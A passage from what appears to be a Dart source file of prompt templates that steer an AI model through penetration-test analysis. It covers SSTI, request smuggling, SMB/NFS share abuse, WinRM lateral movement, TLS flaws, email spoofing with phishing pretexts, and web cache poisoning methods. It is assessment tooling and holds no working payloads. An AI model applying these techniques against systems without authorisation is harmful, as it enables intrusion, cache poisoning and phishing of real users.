Attacker objective: inject template expressions that execute arbitrary code on the server.
Generate when the technology stack suggests a server-side template engine:
- Identify template engine from: X-Powered-By header, Server header, framework error messages, "technologies" array
- Testing approach: inject a mathematical expression using the engine's delimiter syntax into reflected input fields — if the computed result is returned rather than the literal string, template injection is confirmed
- Input surfaces: URL parameters, form fields, search terms, profile fields, error messages that echo input
- Severity: CRITICAL — SSTI provides a direct path to RCE on the server
Evidence: error messages disclosing template engine names, reflected input in response bodies

### Host Header Injection
Attacker objective: poison the Host header used by the application to construct URLs in emails or responses.
Generate when any of the following evidence is present:
- Password reset, account confirmation, or any email-sending functionality — CRITICAL (password reset poisoning)
- Caching headers present (X-Cache, X-Varnish, CF-Cache-Status) — HIGH (cache poisoning)
- Via or X-Forwarded-For indicating a proxy chain — MEDIUM (SSRF escalation via Host-based routing)
Testing approach: send a request with a modified Host header and observe response body, Location header, or subsequent email content

### HTTP Request Smuggling
Attacker objective: inject a request prefix that poisons the next victim's request by exploiting parsing differences between a front-end proxy and back-end server.
Generate ONLY when proxy chain evidence is present:
- Required evidence: Via header, X-Forwarded-For, CDN/load balancer headers (CF-Ray, X-Amz-Cf-Id, X-Cache), HTTP/1.1 confirmed through a proxy layer
- Severity: HIGH — confirmed smuggling enables request hijacking, cache poisoning, and credential capture
- Do NOT generate this finding speculatively — proxy chain evidence is mandatory

### Open Redirects
Attacker objective: redirect users to attacker-controlled destinations using the target's trusted domain.
Generate when redirect parameters are observed in recon data:
- Evidence: URL parameters named return, redirect, next, url, goto, destination, target, location, to, forward, continue; 302 responses with a URL in the Location header
- Severity: MEDIUM when OAuth is present (authorization code theft chain); MEDIUM when combined with authentication flows; LOW standalone
- Do NOT generate if no redirect-capable parameters were observed in recon

### CRLF Injection
Attacker objective: inject arbitrary HTTP headers by inserting CRLF characters into parameters reflected in response headers.
Generate when user input is reflected in response headers:
- Evidence: URL parameters or form fields reflected verbatim in response headers (Location, Set-Cookie, Content-Disposition)
- Severity: MEDIUM for header injection; HIGH if Set-Cookie injection enabling session fixation is evidenced

### HTTP Security Headers
Attacker objective: exploit missing defensive headers to enable or escalate other attacks.
Generate findings for missing/misconfigured headers ONLY when response headers were captured in recon:
- Missing `Content-Security-Policy` on input-handling pages: MEDIUM
- Missing `X-Frame-Options` or frame-ancestors CSP (clickjacking): LOW
- Missing `X-Content-Type-Options: nosniff` (MIME confusion): LOW
- `Referrer-Policy` absent or set to `unsafe-url` (credential leakage): LOW
- Missing `Permissions-Policy` on externally accessible pages: LOW
Do NOT generate security header findings speculatively — require captured response headers as evidence

### Cookie Security Attributes
Attacker objective: steal session tokens, perform session fixation, or enable cross-site request forgery by exploiting insecure cookie configuration.
Generate ONLY when Set-Cookie headers were captured in recon data — do NOT generate speculatively.
- Missing `HttpOnly` flag on session or authentication cookies: JavaScript can read the cookie value — any XSS vulnerability immediately escalates to full session hijack. Severity: MEDIUM. Generate for every distinct session/auth cookie missing this flag.
- Missing `Secure` flag on session cookies served over HTTPS: the cookie is transmitted on any HTTP request, including HTTP downgrade attacks and mixed-content subresource loads. Severity: MEDIUM on HTTPS-only sites; HIGH if the application is also accessible over plain HTTP.
- Missing or insufficient `SameSite` attribute: absence of SameSite defaults to `Lax` in modern browsers but `None` in older ones — cross-site form submission POST requests may include the cookie, enabling CSRF. `SameSite=None` without `Secure` is rejected by modern browsers but transmitted on HTTP. Severity: MEDIUM for authentication or state-changing cookies.
- Overly broad `Domain` attribute (e.g. `Domain=.example.com`): makes the cookie accessible to all subdomains including any compromised or attacker-controlled subdomain. If subdomain takeover surface exists on this target, a broad domain attribute allows the takeover to steal authenticated sessions. Severity: MEDIUM when combined with subdomain takeover findings; LOW otherwise.
- Overly broad `Path=/` on sensitive cookies: exposes authentication cookies to all application paths, including paths serving attacker-uploaded or third-party content. Severity: LOW.
- Session cookie without `__Host-` prefix on HTTPS applications: the `__Host-` cookie prefix enforces Secure flag, restricts to the exact host (no Domain attribute permitted), and requires Path=/. Absence is a defence-in-depth finding. Severity: LOW, informational.
Evidence: Set-Cookie headers in captured HTTP responses. Each distinct misconfigured cookie is a separate finding.

## RULES:
- Only include findings for HTTP/HTTPS ports
- Business logic: infer from application purpose — e-commerce and financial applications always warrant race condition and price manipulation findings
- HTTP Request Smuggling: only if proxy chain headers (Via, CF-Ray, X-Cache) were observed
- Security headers: only if response headers were captured in recon data
- Cookie attributes: only if Set-Cookie headers were captured in recon data — do NOT generate speculatively
- Open redirects: only if redirect-capable parameters were observed
- Do NOT generate DoS findings against third-party infrastructure the client does not control
- Each vulnerability class is a SEPARATE entry
- Description MUST include: URL path, HTTP method, parameter name, and the attacker's goal

''';
  }

  /// Network-service focused analysis prompt.
  /// Only fire when non-web service ports are present.
  static String networkServiceAnalysisPrompt(String deviceJson) => '''
You are an expert network penetration tester. Analyze the device data below and identify EXPLOITABLE network-service vulnerabilities only.

## DEVICE DATA:
$deviceJson

## SCOPE — only network service attack classes:
- SMB (EternalBlue/MS17-010 on Windows, SambaCry on Linux, null sessions, anonymous shares)
- FTP (anonymous login, version CVEs, writable directories)
- SSH (default/weak credentials, version CVEs, SSHv1)
- RDP (BlueKeep, NLA disabled, default credentials)
- Databases: MySQL/MSSQL/PostgreSQL/Redis (unauthenticated access, default creds, version CVEs)
- DNS (zone transfer, recursion, version CVEs in DNS server software)
- UPnP (SSDP info disclosure, SOAP command injection)
- Telnet (cleartext, default credentials)
- VNC (no auth, weak password)
- SNMP (default community strings, version 1/2c)
- WinRM / PowerShell Remoting (ports 5985/5986, service name winrm or microsoft-httpapi):
  Attacker objective: authenticate with obtained credentials to achieve PowerShell remoting session equivalent to interactive administrator access.
  Evidence to look for: port 5985 (HTTP) or 5986 (HTTPS) open; service name "winrm", "microsoft-httpapi", or "wsman"; Windows host indicators.
  Generate a finding when WinRM ports are detected: accessibility combined with any credential (domain account, local admin) yields remote command execution.
  Severity: HIGH when accessible with non-admin credentials; CRITICAL when accessible from external network or without authentication.
- WMI over DCOM (port 135 + Windows host + domain environment):
  Attacker objective: execute commands via Windows Management Instrumentation using any valid credential — a native Windows capability that is difficult to detect.
  Evidence to look for: port 135 (RPC endpoint mapper) open on a Windows host with a domain environment confirmed; any Windows service account implied by application stack.
  Severity: HIGH — WMI lateral movement is difficult to detect and natively trusted by Windows.
- Any other non-web service: banner grab → version → CVE match

## IPv6 ATTACK SURFACE (Phase 14.5)
Generate IPv6 findings ONLY when IPv6 addresses, IPv6 services, or dual-stack indicators are directly observed in the scan data. Do NOT generate IPv6 findings based solely on the OS type. If no IPv6 evidence is present, skip this section entirely.

**Rogue Router Advertisement (RA):**
An attacker on the local segment can broadcast Router Advertisement messages claiming to be the default IPv6 gateway — without any authentication. Hosts that accept the advertisement will route all IPv6 traffic through the attacker, enabling man-in-the-middle attacks.
Evidence: IPv6 address in device data; dual-stack configuration indicators; IPv6-related services observed.
Severity: HIGH — passive traffic interception for all IPv6 traffic on the segment.

**DHCPv6 Rogue Server:**
A rogue DHCPv6 server can provide IPv6 addresses and DNS server configuration to all hosts on the segment, redirecting DNS resolution to an attacker-controlled resolver.
Evidence: DHCPv6 service indicators or IPv6 addresses observed in scan data.
Severity: HIGH — DNS redirection enables phishing and credential capture.

**IPv6 Firewall Bypass:**
IPv4 firewall rules frequently have no IPv6 equivalents. Services blocked on IPv4 may be accessible on the same host via IPv6.
Evidence: host with both IPv4 and IPv6 addresses in recon data; services that appear filtered on IPv4.
Severity: MEDIUM — specific severity depends on which services become accessible.

**IPv6 Tunneling Protocol Bypass:**
IPv6 tunneling protocols (6to4, Teredo, ISATAP) may bypass network segmentation controls by tunneling IPv6 over IPv4 UDP.
Evidence: Teredo or ISATAP indicators in interface data; IPv6 tunnel endpoints observed.
Severity: MEDIUM — network segmentation controls may be bypassed.

Generate IPv6 findings ONLY when direct IPv6 evidence is present in the scan data. Do NOT generate these findings based on OS type alone.

## SMB/NFS SHARE PERMISSION TESTING (Phase 33)
File share access control misconfigurations are among the most consistently found internal findings. Generate findings for each condition below when the relevant ports or services are evidenced.

### SMB Share Enumeration and Permission Testing
Testing methodology for any target with SMB accessible:
1. Enumerate shares accessible without credentials (null session) — list share names, types, and comments
2. Enumerate shares accessible with any domain user credentials — document all visible shares
3. For each accessible share, test directory listing and file read access
4. Test write access to each readable share — write access to administrative or operational shares is a CRITICAL finding
High-risk share patterns (generate specific findings for any of these observed or plausible):
- Shares containing scripts executed by scheduled tasks or Group Policy (writable → code execution on every connecting host)
- SYSVOL and NETLOGON shares (contain Group Policy files; historically stored credentials in GPP XML files with a published encryption key — the cpassword attribute in Groups.xml, Services.xml, Scheduledtasks.xml is decryptable by any domain user)
- Shares with "backup", "password", "credential", "secret", "config", or "admin" in their name or path
- Share ACLs granting write access to "Domain Users", "Authenticated Users", "Everyone", or similar broad groups
Evidence: SMB port 445 accessible; any share listing data in recon.
Severity: CRITICAL for writable shares containing executed scripts or GPP credential files; HIGH for read access to sensitive data shares; MEDIUM for unauthenticated share access.

### NFS Export Misconfiguration
NFS v2/v3 exports rely entirely on IP-based access control with no per-user authentication. Misconfigured exports allow any host to mount and read (or write) the filesystem.
Evidence to look for and generate findings for:
- Export configured with wildcard host permission (*) allowing any host to mount
- Export configured without root_squash — remote root users access files as local root
- NFS v2/v3 in use (v4 adds Kerberos authentication support; v2/v3 have none)
- Sensitive filesystem paths exported (home directories, /etc, application config directories, database data directories)
Evidence: port 2049 accessible; NFS service identified in banner or service name.
Severity: CRITICAL for writable exports without root squashing; HIGH for read-only exports of sensitive paths.

## SECOND-ORDER INJECTION IN NETWORK PROTOCOLS (Phase 13.2)
- **SNMP community strings in logging/SIEM queries:** If SNMP community strings are stored and later used in log queries or SIEM correlation rules, injecting SQL or LDAP metacharacters into the community string field may trigger second-order injection in the logging backend.
- **SMTP headers in mail processing:** User-controlled data in SMTP headers (From, Subject, custom headers) that is stored and later processed by mail filtering or archiving systems may trigger second-order injection in those systems.
- **LDAP attribute injection via stored values:** Values stored in LDAP attributes that are later used in LDAP search filters without escaping may enable LDAP injection when those attributes are queried.
Generate these findings at LOW confidence when the relevant protocol is present — second-order injection in network protocols requires knowledge of the backend processing pipeline.

## RULES:
- Only include findings for non-web ports
- EXACT product name from banner must match CVE affected product
- Router/IoT embedded Samba is NOT exploitable with server exploits
- Each CVE from vulners/vulscan output is a SEPARATE entry

''';

  /// External-target network service analysis prompt.
  /// Fire condition: external target AND non-web, non-CDN service ports are directly accessible.
  ///
  /// Intelligence source: service banners, port listings, version strings.
  /// Attacker objective: exploit directly exposed services that should not be internet-facing.
  static String externalNetworkServicePrompt(String deviceJson) => '''
You are an expert penetration tester analyzing an EXTERNAL (internet-facing) target that has non-web service ports directly accessible from the internet. This is unusual and high-priority — these services should rarely be internet-facing.

## DEVICE DATA:
$deviceJson

## SCOPE — focus on exposed external services:
These service categories are high-value when exposed externally:

### DATABASE SERVICES (MySQL/3306, PostgreSQL/5432, MSSQL/1433, MongoDB/27017, Redis/6379, Elasticsearch/9200, Memcached/11211)
- Unauthenticated access — many databases have no auth by default (Redis, MongoDB before 4.0, Elasticsearch)
- Default credentials for the specific product (root with no password for MySQL, etc.)
- Version-specific CVEs — exposed databases are often unpatched
- Severity: CRITICAL — databases should NEVER be directly internet-accessible

### REMOTE ACCESS (SSH/22, RDP/3389, VNC/5900, Telnet/23)
- SSH: version CVEs, weak host key algorithms, default credentials if applicable
- RDP: BlueKeep (pre-authentication RCE in unpatched Windows 7/Server 2008 R2 and earlier), NLA disabled, default credentials — CRITICAL if exposed externally
- VNC: no authentication, weak password — CRITICAL if exposed externally
- Telnet: cleartext protocol, always flag as HIGH for cleartext credential exposure

### ADMINISTRATIVE AND MANAGEMENT INTERFACES
- Any management port exposed externally is a HIGH severity finding
- Note the service, version, and what an attacker could do with access

## RULES:
- EXACT product name from banner must match CVE affected product
- Each exposed service port gets at minimum: an "Externally Exposed Service" finding noting it should not be internet-accessible, plus any applicable CVE or default credential findings
- Severity for externally exposed databases/RDP/VNC: CRITICAL regardless of authentication state
- Do NOT generate web application findings (SQLi, XSS, etc.) — those are handled by the web app prompt
- Do NOT generate findings for ports 80, 443, 8080, 8443 (web ports)

''';

  /// CVE / version-matching analysis prompt. Fires for all scans.
  ///
  /// Intelligence source: service banners, version strings, vulners/vulscan output.
  /// Attacker objective: identify exploitable software versions and CVEs.
  static String cveVersionAnalysisPrompt(String deviceJson, {TargetScope scope = TargetScope.internal}) {
    final isExternal = scope == TargetScope.external;
    final scopeNote = isExternal
        ? '\n## EXTERNAL TARGET: Do NOT generate SMB (445), RDP (3389), or other LAN-only service findings unless those ports are explicitly listed as open in the device data.\n## DO NOT generate DoS findings against third-party infrastructure (CDNs, cloud providers, email gateways) that the client does not own — these are not actionable pentest findings.'
        : '';
    return '''
You are an expert CVE researcher and penetration tester. Analyze the device data below and identify vulnerabilities through strict product+version matching.

## DEVICE DATA:
$deviceJson$scopeNote

## TASKS:

### 1. Strict Version-Based Vulnerability Class Matching
For every service with a product name AND version string:
- Identify the software family and version era from the banner (product name + major.minor version)
- Match the identified version against known vulnerability classes for that software family — reason about version ranges, not individual CVE IDs
- If a specific CVE ID is known and highly relevant, include it; but the primary output should describe the vulnerability class and affected version range
- If product cannot be positively identified from the banner, use LOW confidence and describe the attack class generically rather than attributing to a specific product

### 2. Software Family → Vulnerability Class Guidance
Use this mapping to guide your analysis — when a software family is identified, check its version against the listed vulnerability class eras:

**Web Servers:**
- Apache HTTP Server: path traversal and RCE classes appear in specific minor version ranges; HTTP/2 implementation flaws in older 2.4.x series; mod_auth authentication bypass classes in specific module versions
- Nginx: HTTP request smuggling and header injection classes in specific version series; integer overflow classes in connection handling in older versions
- IIS (Microsoft): WebDAV-related RCE classes in older major versions; ASP.NET deserialization and path disclosure classes; HTTP.sys remote code execution in specific kernel-mode HTTP stacks

**Application Frameworks:**
- Apache Struts: OGNL injection RCE class is a recurring pattern across multiple version series — check all identified Struts versions against OGNL evaluation vulnerability classes
- Apache Log4j: JNDI lookup injection class affects specific version ranges — any Java application using Log4j should be assessed for this class
- Spring Framework: SpEL injection and data binding RCE classes in specific major versions; actuator endpoint exposure in Spring Boot versions without security defaults
- Drupal: PHP code execution via deserialization and REST API classes in specific major version series
- WordPress: XML-RPC authentication bypass; REST API user enumeration; plugin/theme arbitrary file upload and RCE classes

**Database Servers:**
- MySQL/MariaDB: authentication bypass classes in specific version series; user-defined function (UDF) privilege escalation when FILE privilege is granted
- PostgreSQL: copy-from-program RCE when superuser access obtained; specific version series contain privilege escalation via schema manipulation
- Redis: unauthenticated access leading to filesystem write RCE via configuration commands; SSRF to Redis enabling lateral movement
- MongoDB: authentication disabled by default in older major versions; JavaScript injection in versions with server-side JS execution

**SSH Servers:**
- OpenSSH: username enumeration via timing differences in specific version ranges; pre-authentication RCE classes in older server versions; agent forwarding credential theft when `ForwardAgent` enabled

**Network Services:**
- OpenSSL: Heartbleed memory disclosure in versions prior to the 1.0.1 security patch; DROWN cross-protocol attack when SSLv2 support present
- Exim: privilege escalation and RCE via mail routing logic in specific version series; SMTP injection classes
- vsftpd: backdoor RCE in a specific compromised release; anonymous access leading to writable directory abuse

**CMS Platforms:**
- Any identified CMS version: cross-reference against known vulnerability classes for that major version — plugin/extension vulnerabilities are typically higher impact than core vulnerabilities for well-maintained CMS platforms

### 3. Speculative / Architectural Reasoning (STRICT LIMITS)
Only generate speculative findings if:
- The attack surface is DIRECTLY OBSERVED in the scan data (e.g. the endpoint exists, the service responds)
- A WAF being detected is NOT direct evidence of HTTP request smuggling — do not generate smuggling findings unless traffic manipulation evidence is present
- Findings without a specific CVE AND without directly observed attack surface MUST be rated LOW confidence
- MEDIUM or HIGH confidence requires actual observed evidence, not theoretical reasoning

## RULES:
- Never assume product from port number alone
- Unknown/generic banners: LOW confidence on CVEs, MEDIUM on generic attack classes
- Each CVE is a separate entry
- Do NOT generate DoS findings against third-party infrastructure the client does not control

''';
  }

  /// SSL/TLS focused analysis prompt — only fired for external targets with web ports.
  ///
  /// Intelligence source: SSL/TLS scan output, certificate data, cipher suite lists.
  /// Attacker objective: decrypt traffic, forge certificates, or exploit protocol weaknesses.
  static String sslTlsAnalysisPrompt(String deviceJson) => '''
You are an expert in SSL/TLS security. Analyze the device data below and identify EXPLOITABLE SSL/TLS vulnerabilities only.

## DEVICE DATA:
$deviceJson

## SCOPE — only SSL/TLS attack classes:
- Heartbleed: OpenSSL versions prior to 1.0.1g — memory disclosure via malformed heartbeat extension
- POODLE: SSLv3 enabled — padding oracle attack decrypts encrypted traffic
- BEAST: TLS 1.0 with CBC cipher suites — plaintext recovery via chosen-boundary attack
- CRIME/BREACH: TLS compression enabled — session token recovery via compression oracle
- DROWN: SSLv2 enabled — cross-protocol attack decrypts TLS sessions using SSLv2 export ciphers
- ROBOT: RSA PKCS#1 v1.5 padding oracle — signature forging without the private key
- Weak cipher suites: RC4, DES, 3DES, NULL, EXPORT ciphers
- Expired or self-signed certificates (check expiry date explicitly)
- Missing certificates / certificate errors
- Certificate CN/SAN mismatch
- Missing HSTS header
- TLS 1.0/1.1 still enabled (deprecated)
- Weak key sizes: RSA keys smaller than 2048 bits; ECDSA/ECC keys smaller than 256 bits

## KEY SIZE RULES (CRITICAL — read carefully):
- RSA < 2048 bits → flag as weak
- ECDSA/ECC < 256 bits → flag as weak
- P-256 (256-bit ECDSA) is NIST-recommended and ACCEPTABLE — do NOT flag it
- "256-bit ECDSA" or "P-256" or "prime256v1" = acceptable, NOT a finding
- Only flag if the key size is STRICTLY LESS THAN the thresholds above

## RULES:
- Only include findings backed by evidence in the device data (cipher lists, version strings, script output)
- Each issue is a SEPARATE entry
- Description MUST include the specific cipher/protocol/key size observed

''';

  /// DNS & OSINT intelligence analysis prompt (Phase 3.1).
  /// Fire condition: external target AND dns_findings / domain_information present.
  ///
  /// Intelligence source: DNS records, WHOIS, CNAME chains, MX, SPF/DKIM/DMARC, TXT records.
  /// Attacker objective: discover attack surface invisible to port scanners.
  static String dnsOsintAnalysisPrompt(String deviceJson) => '''
You are an expert in DNS security and OSINT analysis for external penetration testing. Analyze the DNS and domain intelligence data below to identify attack surface that port scanners cannot see.

## DEVICE DATA:
$deviceJson

## MANDATORY ANALYSIS AREAS:

### 1. CMS / Hosting Platform Identification from CNAME
Examine every CNAME record in dns_findings and domain_information:
- CNAME containing "wpenginepowered.com" or "wpengine.com" → WordPress on WPEngine (HIGH confidence)
- CNAME containing "wordpress.com" → WordPress.com hosted
- CNAME containing "sites.google.com" → Google Sites
- CNAME containing "myshopify.com" → Shopify
- CNAME containing "squarespace.com" → Squarespace
- CNAME containing "netlify" → Netlify
- CNAME containing "github.io" → GitHub Pages
- Generate an informational finding for any identified CMS/platform — this is critical context

### 2. Email Security Record Discovery
Identify and report the values of email security records — do NOT generate SPF/DMARC/DKIM vulnerability findings here (those are handled by the dedicated email security prompt to avoid duplicates). Instead, note the following as part of informational context:
- Report the SPF record value and its qualifier (e.g. "~all" softfail vs "-all" hardfail)
- Report whether DMARC is present and its policy level ("p=none", "p=quarantine", "p=reject")
- Report any DKIM selector names found
- If MX records are present, note the mail provider/gateway identified from the MX hostname
Generate exactly ONE informational finding titled "Email Security Records" (vulnerabilityType: "Info Disclosure", severity: LOW) summarising the record values found — this gives the report reader context without duplicating the findings generated by the email security prompt.

### 3. Subdomain Takeover Surface
Look for CNAME records pointing to third-party services that may be unclaimed:
- GitHub Pages, Heroku, Netlify, Vercel, Fastly, Azure, AWS S3/CloudFront with generic names
- If a CNAME points to a service subdomain and no content is confirmed there, flag for takeover testing
- Generate a MEDIUM finding for each potential dangling CNAME

### 4. Origin IP Discovery Paths (CDN bypass)
Identify IPs that may bypass CDN/WAF — look for:
- SMTP/MX server IP addresses (email servers often reveal origin hosting)
- Historical A records or IPs in SPF "ip4:" directives
- Any A record not pointing to known CDN ranges (Cloudflare: 104.x, 172.64-68.x, 162.158.x)
- Generate a finding for any non-CDN IP that could be the origin server

### 5. Third-Party SaaS Exposure
Identify SaaS platforms from TXT verification records:
- MS-verify, MX records pointing to Microsoft 365 → Microsoft 365 tenant identified (phishing surface)
- google-site-verification → Google Workspace
- Salesforce, Wrike, Okta, HubSpot verification records → identify each SaaS platform
- Each identified SaaS platform is a potential phishing target and OAuth attack surface

### 6. DNSSEC and NS Provider Risk
- DNSSEC absent → LOW severity finding (vulnerable to DNS cache poisoning)
- Single NS provider → note as single point of failure for DNS hijacking

## RULES:
- Only generate findings backed by data present in dns_findings, domain_information, or other_findings
- Do NOT generate findings about services not mentioned in the DNS data
- CMS identification from CNAME is HIGH value — always generate this finding if CNAME evidence exists
- DO NOT generate SPF/DMARC/DKIM vulnerability findings (severity HIGH/MEDIUM/LOW for email spoofing) — those are produced by the email security prompt; generate only the single "Email Security Records" informational summary
- Informational/context findings (CMS identification, SaaS exposure, email record summary) use vulnerabilityType: "Info Disclosure"
- Subdomain takeover and origin IP findings use vulnerabilityType: "Config Weakness"

''';

  /// Email security posture prompt (Phase 3.2).
  /// Fire condition: external target AND MX records present.
  ///
  /// Intelligence source: MX records, SPF TXT records, DMARC TXT records, SMTP server data.
  /// Attacker objective: send spoofed email from the target domain; identify phishing paths.
  static String emailSecurityPrompt(String deviceJson) => '''
You are an expert in email security and penetration testing. Analyze the email infrastructure data below to identify email-based attack vectors against this organization.

## DEVICE DATA:
$deviceJson

## ANALYSIS AREAS:

### 1. Email Spoofing Viability
Can an attacker send email that appears to come from this organization's domain?
- Check SPF record: "~all" (softfail) = spoofable through many mail servers; "-all" = protected
- Check DMARC policy: missing = no enforcement; "p=none" = monitoring only, spoofing still effective; "p=quarantine/reject" = protected
- Check DKIM: absence means no cryptographic signing — spoofed mail cannot be distinguished from legitimate mail
- Severity: SPF missing = HIGH; SPF softfail + DMARC missing = HIGH; SPF softfail + DMARC p=none = MEDIUM

### 2. Email Gateway Fingerprinting
Identify the email security gateway from MX record hostnames:
- Hostnames containing "barracuda" → Barracuda Email Security Gateway
- Hostnames containing "proofpoint" → Proofpoint Email Protection
- Hostnames containing "mimecast" → Mimecast
- Hostnames containing "messagelabs" or "symantec" → Broadcom/Symantec Email Security
- Hostnames containing "protection.outlook" or "mail.protection.outlook" → Microsoft Exchange Online Protection
- Each identified gateway has known bypass techniques and CVE history — note it as an informational finding

### 3. SMTP Server Direct Access
If SPF record contains "ip4:" directives, those IPs are the organization's actual mail servers:
- These IPs may bypass CDN/WAF and reveal origin hosting
- Direct SMTP access (port 25) to these IPs may allow: relay testing, VRFY/EXPN enumeration, banner disclosure
- Flag any SPF "ip4:" addresses as potential origin server candidates

### 4. Phishing Scenario Assessment
Given the organization's visible infrastructure, identify the highest-value phishing scenarios:
- Microsoft 365 tenant → impersonate IT department sending "password reset" or "MFA enrollment required"
- Google Workspace → impersonate Google Drive sharing notification
- Any identified SaaS platforms → impersonate that platform's login page

## SEVERITY MAPPING:
- SPF missing entirely → HIGH
- SPF softfail (~all) with DMARC missing or p=none → HIGH
- DMARC missing (with any SPF) → MEDIUM
- DMARC p=none (monitoring only) → LOW
- SMTP servers directly accessible → MEDIUM (depends on what relay/enumeration reveals)

## RULES:
- Only generate findings where MX or email-related DNS data is present
- Each distinct email security issue is a SEPARATE finding
- vulnerabilityType for spoofing findings: "Config Weakness"
- vulnerabilityType for gateway findings: "Info Disclosure"

''';

  /// Web Cache Poisoning prompt.
  /// Fire condition: web ports present AND cache layer indicators detected
  /// (X-Cache, CF-Cache-Status, Age, Varnish, or CDN indicators).
  ///
  /// Intelligence source: response headers, CDN indicators, URL parameter observations.
  /// Attacker objective: inject a malicious cached response that is served to all subsequent
  /// users who request the same cache-keyed resource.
  static String webCachePoisoningPrompt(String deviceJson) => '''
You are an expert web penetration tester specialising in caching infrastructure attacks. Analyze the device data below and identify EXPLOITABLE web cache poisoning vulnerabilities.

## DEVICE DATA:
$deviceJson

## BACKGROUND — WHY CACHE POISONING IS HIGH IMPACT
Unlike most web vulnerabilities that affect a single user per request, a successfully poisoned cache entry is served to every user whose request matches the cache key until the entry expires or is purged. A single poisoning request can deliver XSS payloads, open redirects, or malicious content to thousands of users with no further attacker interaction.

## SCOPE — Cache Poisoning Attack Classes

### 1. Unkeyed Header Injection
Attacker objective: inject a request header that is excluded from the cache key but influences the response — the poisoned response is then cached and served to all users whose requests match the keyed components (URL + keyed query params).

**X-Forwarded-Host / X-Host injection:**
Many applications use these headers to construct absolute URLs in responses (redirects, canonical link tags, password reset links, Open Graph URLs). If the header is processed by the origin but excluded from the cache key, an attacker-controlled hostname in X-Forwarded-Host is cached and delivered to all subsequent users.
Evidence: any absolute URL in response body or headers (Location, Link rel=canonical); X-Forwarded-Host or X-Host accepted by server (observe if response body changes).
Severity: HIGH when URL reflection confirmed; CRITICAL if XSS payload in reflected URL is cached.

**X-Original-URL / X-Rewrite-URL header:**
Symfony, Django, and some Nginx configurations use these headers to override the request path at the framework level. If the cache key is based on the original URL but the origin serves content based on X-Original-URL, injecting a different path may cache the wrong content at the original URL.
Evidence: Symfony, Django, or Nginx reverse proxy indicators; any path-based routing.
Severity: HIGH — can serve attacker-chosen content at any cached URL.

**X-Override-URL / X-HTTP-Method-Override:**
Framework-specific headers that alter request routing or method — may affect response content without being cache-keyed.
Evidence: framework indicators (Rails, Laravel, Spring).

**Forwarded (RFC 7239):**
Structured equivalent of X-Forwarded-* headers. Some origins process this but caches exclude it from the key.
Evidence: Forwarded header accepted by server.

Testing methodology for unkeyed headers:
1. Send a baseline request and note the response
2. Add the candidate header with a unique distinguishable value (e.g. X-Forwarded-Host: attacker-unique-id.test)
3. If the response body or Location header changes to include your injected value: the header is unkeyed and affects the response
4. Check whether a second request WITHOUT the header returns the poisoned version from cache
5. Confirm with a cache hit indicator (Age > 0, X-Cache: HIT, CF-Cache-Status: HIT)

### 2. Fat GET / Parameter Cloaking
Attacker objective: include a request parameter that the cache ignores but the origin processes, causing a poisoned response to be stored under the clean URL cache key.

**Fat GET body parameter:**
Some origins process query parameters from the GET request body (unusual but present in some frameworks). The cache keys on the URL only and ignores the body. A GET request with a body containing `?injected=<xss>` may poison the cache for the URL `/page`.
Evidence: any application framework that processes GET body parameters; observable different response when GET has body vs no body.
Severity: CRITICAL if XSS is reflected from GET body parameter and cached.

**Parameter cloaking via encoded delimiters:**
URL-encoded ampersands in query strings that some cache parsers split differently from the origin parser. Example: `/page?param=normal%26injected=<xss>` — the cache may treat this as a single parameter while the origin splits it at %26 and processes `injected` separately.
Evidence: any query parameter reflected in the response.

**Excluded tracking parameters:**
CDN configurations commonly exclude tracking/analytics parameters (utm_*, fbclid, gclid, _ga) from the cache key because including them would fragment the cache. If the origin reflects any of these parameters in the response, injecting an XSS payload via an excluded parameter poisons the cache for the clean URL.
Evidence: CDN present; any reflected query parameter in the response; common tracking parameter names in URLs observed during recon.
Severity: CRITICAL when XSS payload in excluded parameter is reflected and cached.

### 3. Vary Header Misconfigurations
Attacker objective: poison a response variant that is served to a broad population of users sharing a common header value.

**Vary: User-Agent poisoning:**
When `Vary: User-Agent` is present, different cached copies exist per User-Agent string. A common user agent (Chrome/120 on Windows) has a large user population — poisoning the cache entry for that UA string delivers the poisoned response to all Chrome 120 on Windows users.
Evidence: `Vary: User-Agent` in captured response headers.
Severity: HIGH — population of affected users is large for common UA strings.

**Missing or over-broad Vary header:**
A missing Vary header on content that differs by Accept-Language or Authorization may serve cached responses for User A to User B if both requests are otherwise identical.
Evidence: authenticated endpoints with no Vary header; multilingual applications without `Vary: Accept-Language`.
Severity: MEDIUM — may serve one user's authenticated content to another user.

### 4. Web Cache Deception (distinct from poisoning)
Attacker objective: trick a victim into caching their own authenticated response at a URL the attacker can later fetch.

Attack path: the attacker sends a victim a link to a URL that looks like a static asset but actually serves the victim's authenticated dynamic content — e.g. `https://target.com/account/profile/style.css`. If:
1. The application serves the `/account/profile` response for this URL (it ignores or strips the unrecognised extension)
2. The cache stores the response because the `.css` extension looks static

Then the attacker fetches the same URL from their own browser and receives the cached copy of the victim's profile data.

Evidence to look for:
- Application uses path-based routing without strict extension validation
- CDN or cache configured to cache responses by file extension or Content-Type
- Authenticated user data (profile, account details, API responses) accessible via GET requests
Severity: HIGH when sensitive authenticated data (tokens, PII, account data) is exposed.

### 5. Cache-Key Normalization Differences
Attacker objective: craft a URL that the cache normalises to match an existing cached entry but the origin processes differently, or vice versa.
- Path traversal sequences that the CDN normalises but the origin processes: `/app/../admin` → CDN normalises to `/admin` but origin may not
- Double-slash normalization: `//admin` treated differently by cache vs origin
- Trailing slash differences: `/page` and `/page/` cache separately but origin serves identical content
Evidence: any path traversal or URL normalisation behaviour visible in recon responses.
Severity: MEDIUM — can serve content intended for one path at another path's cache entry.

## RULES:
- CONFIDENCE FLOOR: MEDIUM requires cache headers confirmed in recon data. HIGH requires both cache hit behaviour and response manipulation confirmed. LOW for deduction from CDN presence alone.
- Each technique is a SEPARATE finding
- Do NOT generate cache poisoning findings without evidence of a caching layer (X-Cache, CF-Cache-Status, Age header, known CDN, or Varnish/Squid indicators)
- Web Cache Deception and Web Cache Poisoning are separate finding types — do not conflate them
- Do NOT generate DoS findings against CDN infrastructure the client does not control
- Severity escalates to CRITICAL when a cached XSS payload would affect all users visiting the poisoned URL

''';

  /// DOM / JavaScript client-side attack surface analysis prompt.
  /// Fire condition: web ports present AND SPA framework or JS-heavy application
  /// indicators detected (React/Angular/Vue/Next.js, /_next/ paths, bundle.js, etc.).
  ///
  /// Intelligence source: technology stack, observed JS asset paths, framework headers.
  /// Attacker objective: exploit client-side trust boundaries, extract embedded secrets,
  /// and abuse browser messaging APIs.
  static String domJavaScriptAnalysisPrompt(String deviceJson) => '''
